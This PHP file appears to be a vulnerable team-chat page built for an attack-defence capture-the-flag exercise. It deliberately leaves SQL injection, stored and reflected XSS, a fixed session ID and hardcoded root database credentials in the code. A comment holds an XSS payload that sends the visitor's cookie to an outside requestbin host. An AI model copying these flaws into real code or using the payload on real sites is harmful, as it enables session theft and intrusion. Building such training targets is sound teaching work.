<?php
if(strstr($_SERVER['HTTP_HOST'], '12.0')){
	session_id ('ohohcbi3njoueJ3su6slefl4g');
}

//"<script>document.write(\'<img src=\"http://requestbin.fullcontact.com/1ap2jla1?cookie==\'+document.cookie+\'\">aaaa</img>\');</script>"

session_start();

try {
		$bdd = new PDO ('mysql:host=localhost;dbname=ctf','root','Azerty@123');
	}
	catch (Exeption $e) {
		die ('erreur : ' .$e->getmessage()) or die(print_r($bdd->errorInfo()));
	}

if (isset($_POST['valider']))
{
	$message = $_POST['message'];
	$admin='bonjour';
	echo $_POST['message'];
	
	$req = $bdd->query("insert into messages (message) values ('$message') ");
	//$req->execute();
	echo 'message envoyé';
}
?>

<html>
<head>
	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

	<!-- Optional theme -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

</head>
<body>
<div class="container">
<div class="panel panel-default">
  <div class="panel-heading text-center">Attaquez l'équipe adverse et récuperez son flag ... mais attention n'oubliez pas de defendre le votre !</div>
  <div class="panel-body">
    Chat de l'équipe :
	<p>
	<table>
	<?php 
	$req = $bdd->query("select * from messages");
	$req->execute();
	while ($resultat = $req->fetch()){
		echo '<tr><td><li>'.$resultat['message'].'</li></td></tr>';
	 } ?>
	</table>
	</p>
  </div>
  <div class="panel-footer">
	Envoyer un message :
	<form method="post" action="index.php">
			 <textarea name="message" rows="1" cols="50" class="form-control"></textarea> 
			<input type="submit" value="Valider" name="valider" class="form-control">
	</form>
  </div>
</div>
</div>
</body>
</html>
